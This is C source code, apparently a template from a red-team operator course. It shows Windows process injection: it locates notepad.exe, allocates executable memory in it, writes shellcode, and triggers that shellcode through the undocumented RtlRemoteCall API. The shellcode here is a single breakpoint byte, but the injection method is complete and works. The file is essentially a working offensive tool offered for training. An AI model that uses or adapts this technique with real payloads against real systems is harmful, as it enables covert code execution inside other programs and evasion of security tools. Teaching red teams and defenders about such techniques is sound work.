/*

 Red Team Operator course code template
 Playing with RtlRemoteCall
 
 author: reenz0h (twitter: @SEKTOR7net)
 inspiration: zerosum0x0, Dmitry Koder
 
*/

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stddef.h>

#define RETVAL_TAG 0xAABBCCDD

typedef NTSTATUS (NTAPI * RtlRemoteCall_t)(
	HANDLE	Process,
	HANDLE	Thread,
	PVOID	CallSite,
	ULONG	ArgumentCount,
	PULONG	Arguments,
	BOOLEAN	PassContext,
	BOOLEAN	AlreadySuspended
);


int FindTarget(const char * procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int FindThreadID(int pid){

    int tid = 0;
    THREADENTRY32 thEntry;

    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid)  {
			tid = thEntry.th32ThreadID;
			break;
		}
	}
	CloseHandle(Snap);
	
	return tid;
}


int main(void){
	// get process ID and thread ID of the target
	DWORD pID = FindTarget("notepad.exe");
	if (pID == 0) {
		printf("[!] Could not find target process! Is it running?\n");
		return -1;		
	}
	
	DWORD tID = FindThreadID(pID);
	if (tID == 0) {
		printf("[!] Could not find a thread in target process!\n");
		return -1;		
	}
	
	// open both process and thread in the remote target
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pID);
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, tID);
	if (hProcess == NULL || hThread == NULL) {
		printf("[!] Error opening remote process and thread!\n");
		return -1;		
	}

	// resolve needed API pointer
	RtlRemoteCall_t pRtlRemoteCall = (RtlRemoteCall_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlRemoteCall");
	
	if (pRtlRemoteCall == NULL) {
		printf("[!] Error resolving native API call!\n");
		return -1;		
	}
	
	// allocate some space in the target for our shellcode
	void * remote_mem = VirtualAllocEx(hProcess, 0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remote_mem == NULL) {
		printf("[!] Error allocating remote memory!\n");
		return -1;
	}
	printf("[+] Allocated memory = 0x%p\n", remote_mem);

	// shellcode to run remotely
	char SHELLCODE[] = { 0xcc };		// int 3
	size_t sc_size = (size_t) 1;
	
	size_t bOut = 0;
	// write the main payload
	if (WriteProcessMemory(hProcess, (char *) remote_mem, &SHELLCODE, sc_size, (SIZE_T *) &bOut) == 0) {
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		printf("[!] Error writing remote memory (shellcode)!\n");
		return -1;
	}

	// prepare arguments
	size_t remote_args[4];	
	remote_args[0] = (size_t) 0xAAAAAAAA;
	remote_args[1] = (size_t) 0xBBBBBBBB;
	remote_args[2] = (size_t) 0xCCCCCCCC;
	remote_args[3] = (size_t) 0xDDDDDDDD;

	// write arguments into remote process
	size_t * args_ptr;
	args_ptr = (size_t *) ((size_t) remote_mem + sc_size);
	if (WriteProcessMemory(hProcess, args_ptr, &remote_args, sizeof(remote_args), 0) == 0) {
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		printf("[!] Error writing remote memory (args)!\n");
		return -1;		
	}
	
	printf("[+] args = %#zx\n", args_ptr);
	
	// if all is set, make a remote call
	printf("[+] All set!\n"); getchar();
	NTSTATUS status = pRtlRemoteCall(hProcess, hThread, remote_mem, 4, (PULONG) &remote_args, 1, 0);
	
	printf("[+] RtlRemoteCall result: %#x\n", status);
	
	// cleanup
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}